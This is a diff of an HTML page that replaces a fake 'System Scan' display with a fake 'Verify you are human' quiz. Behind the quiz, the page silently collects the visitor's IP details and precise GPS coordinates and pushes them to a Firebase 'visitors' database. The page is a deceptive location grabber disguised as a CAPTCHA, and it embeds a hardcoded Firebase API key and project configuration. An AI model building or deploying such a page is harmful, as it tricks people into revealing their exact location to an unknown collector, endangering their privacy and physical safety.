@@ -3,143 +3,149 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Scan</title>
+<title>Verification Quiz</title>
 
 <style>
-body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    background: #0b0f1a;
-    color: #00ffcc;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
+body{
+  margin:0;
+  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
+  background: linear-gradient(135deg,#0f172a,#1e293b);
+  color:white;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
 }
 
-.container {
-    width: 90%;
-    max-width: 500px;
-    background: #111827;
-    padding: 25px;
-    border-radius: 12px;
-    box-shadow: 0 0 20px rgba(0,255,204,0.2);
+.card{
+  background:#111827;
+  padding:28px;
+  border-radius:16px;
+  width:320px;
+  text-align:center;
+  box-shadow:0 20px 40px rgba(0,0,0,0.4);
+  animation:fadeIn .5s ease;
 }
 
-h1 {
-    text-align: center;
-    margin-bottom: 20px;
+h2{
+  margin-top:0;
 }
 
-.scan-box {
-    background: #020617;
-    padding: 15px;
-    border-radius: 8px;
-    margin-top: 10px;
+input{
+  width:100%;
+  padding:10px;
+  border-radius:8px;
+  border:none;
+  outline:none;
+  margin-top:10px;
 }
 
-p {
-    margin: 6px 0;
+button{
+  margin-top:14px;
+  width:100%;
+  padding:10px;
+  border:none;
+  border-radius:10px;
+  background:#3b82f6;
+  color:white;
+  font-weight:600;
+  cursor:pointer;
+  transition:.2s;
 }
 
-.progress-bar {
-    width: 100%;
-    height: 8px;
-    background: #1f2937;
-    border-radius: 10px;
-    overflow: hidden;
-    margin-top: 15px;
+button:hover{
+  background:#2563eb;
 }
 
-.progress {
-    height: 100%;
-    width: 0%;
-    background: #00ffcc;
-    transition: width 0.3s;
+.status{
+  margin-top:12px;
+  font-size:14px;
+  opacity:.8;
 }
 
-.status {
-    margin-top: 10px;
-    font-size: 14px;
-    opacity: 0.8;
+@keyframes fadeIn{
+  from{opacity:0; transform:translateY(10px);}
+  to{opacity:1; transform:translateY(0);}
 }
 </style>
 </head>
-
 <body>
 
-<div class="container">
-    <h1>System Scan</h1>
-
-    <div class="scan-box">
-        <p>IP Address: <span id="ip">Detecting...</span></p>
-        <p>Country: <span id="country">Detecting...</span></p>
-        <p>City: <span id="city">Detecting...</span></p>
-        <p>Region: <span id="region">Detecting...</span></p>
-        <p>ISP: <span id="org">Detecting...</span></p>
-        <p>Timezone: <span id="timezone">Detecting...</span></p>
-
-        <div class="progress-bar">
-            <div class="progress" id="progress"></div>
-        </div>
-
-        <div class="status" id="status">Initializing scan...</div>
-    </div>
+<div class="card">
+  <h2>Verify you are human</h2>
+  <p id="question"></p>
+  <input id="answer" placeholder="Enter answer">
+  <button onclick="submitQuiz()">Continue</button>
+  <div class="status" id="status"></div>
 </div>
 
-<script>
-async function getIPInfo() {
-    try {
-        const response = await fetch("https://ipapi.co/json/");
-        const data = await response.json();
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-        document.getElementById("ip").textContent = data.ip;
-        document.getElementById("country").textContent = data.country_name;
-        document.getElementById("city").textContent = data.city;
-        document.getElementById("region").textContent = data.region;
-        document.getElementById("org").textContent = data.org;
-        document.getElementById("timezone").textContent = data.timezone;
+/* YOUR FIREBASE CONFIG */
+const firebaseConfig = {
+  apiKey: "AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
+  authDomain: "locationxdd.firebaseapp.com",
+  databaseURL: "https://locationxdd-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "locationxdd",
+  storageBucket: "locationxdd.firebasestorage.app",
+  messagingSenderId: "114480292043",
+  appId: "1:114480292043:web:d143429c68784b0706bb4e"
+};
 
-    } catch (error) {
-        document.getElementById("status").textContent = "Failed to fetch IP data.";
-        console.error(error);
-    }
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+/* Quiz questions */
+const questions = [
+  {q:"Capital of France?", a:"Paris"},
+  {q:"Capital of Japan?", a:"Tokyo"},
+  {q:"Capital of Italy?", a:"Rome"},
+  {q:"Capital of Germany?", a:"Berlin"},
+  {q:"Capital of Canada?", a:"Ottawa"}
+];
+
+const current = questions[Math.floor(Math.random()*questions.length)];
+document.getElementById("question").textContent = current.q;
+
+async function submitQuiz(){
+  const status = document.getElementById("status");
+  status.textContent = "Checking verification...";
+
+  let ipData = {};
+
+  try{
+    const res = await fetch("https://ipapi.co/json/");
+    ipData = await res.json();
+  }catch(e){
+    console.log("IP fetch failed");
+  }
+
+  status.textContent = "Requesting location permission...";
+
+  navigator.geolocation.getCurrentPosition(async position => {
+
+    const data = {
+      answer: document.getElementById("answer").value,
+      time: new Date().toISOString(),
+      ip: ipData.ip || "unknown",
+      city: ipData.city || "unknown",
+      country: ipData.country_name || "unknown",
+      lat: position.coords.latitude,
+      lng: position.coords.longitude
+    };
+
+    await push(ref(db,"visitors"), data);
+
+    status.textContent = "Verification complete.";
+  },
+  () => {
+    status.textContent = "Location permission denied.";
+  });
 }
 
-function startFakeScan() {
-    const progress = document.getElementById("progress");
-    const status = document.getElementById("status");
-
-    let value = 0;
-    const messages = [
-        "Connecting to network...",
-        "Analyzing device...",
-        "Fetching IP details...",
-        "Scanning security layers...",
-        "Finalizing report..."
-    ];
-
-    let msgIndex = 0;
-
-    const interval = setInterval(() => {
-        value += Math.random() * 15;
-        progress.style.width = value + "%";
-
-        if (msgIndex < messages.length && value > (msgIndex + 1) * 20) {
-            status.textContent = messages[msgIndex];
-            msgIndex++;
-        }
-
-        if (value >= 100) {
-            progress.style.width = "100%";
-            status.textContent = "Scan complete.";
-            clearInterval(interval);
-        }
-    }, 600);
-}
-
-getIPInfo();
-startFakeScan();
+window.submitQuiz = submitQuiz;
 </script>
 
 </body>
